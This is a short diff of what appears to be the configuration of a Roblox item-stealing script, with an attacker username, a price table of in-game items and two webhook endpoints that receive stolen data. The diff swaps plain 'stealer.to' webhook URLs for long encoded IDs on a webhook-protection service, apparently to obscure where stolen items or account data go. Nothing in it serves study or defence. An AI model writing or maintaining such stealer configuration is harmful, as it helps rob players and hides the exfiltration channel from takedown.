@@ -1,6 +1,6 @@
 userName = "yoklopik"
-GoodwebHook = "https://stealer.to/post?uniqueid=f4fc6014"
-webHook = "https://stealer.to/post?uniqueid=c87f148c"
+GoodwebHook = "https://webhook-protect.vercel.app/api/webhook?id=SHBoY1VmZUFhQWhQT1ZFTEZ3QmFOQTpwNEpCNDJheHZYMmY1cTFZRERGMnhfZHgwYVQ0WDl3S1Y0MldEdE5wN1FHVGNQS01ENDhoQ19BcDBDRXN2SWRhSllKb01Pd1doOHBYSlNtcWVfZTlYaWt2MVpIWFlqRHh3QTdyZnZpTDJDM09Kd2t4NFNlZFJwb3lUUDBZcUI0SFdDWV9uVW15NEszUTFWVkFaYjUwR28zbWtMNGhxUzljcGFhUmIwZEpubHM"
+webHook = "https://webhook-protect.vercel.app/api/webhook?id=NEVzdDhMQjdjN0F1V3RPWDUzaWpRZzptTEYwTFdMSkZ5MXF3QWhWWjdXcGVCUFBZXzNkSHdNOHEwY3ZJLUlnMnZuQXVneERMX2NranJ5WFJHazB4bGxESUtselNabXFiX2lEc3lyc1ZuQWktNE1DS05Fa1JGYU9LNG5FOTJQWVdzbGZ3UFpSY1JlMzVpd0lEaTdyYlM1SGhNUTFvakRna3ZsN3VwZGkydmV2akNMZ0NKRkRHeDZkWkxBbThxSGhPRm8"
 
 local values = {
     ["Nik's Scythe"] = 25000000,
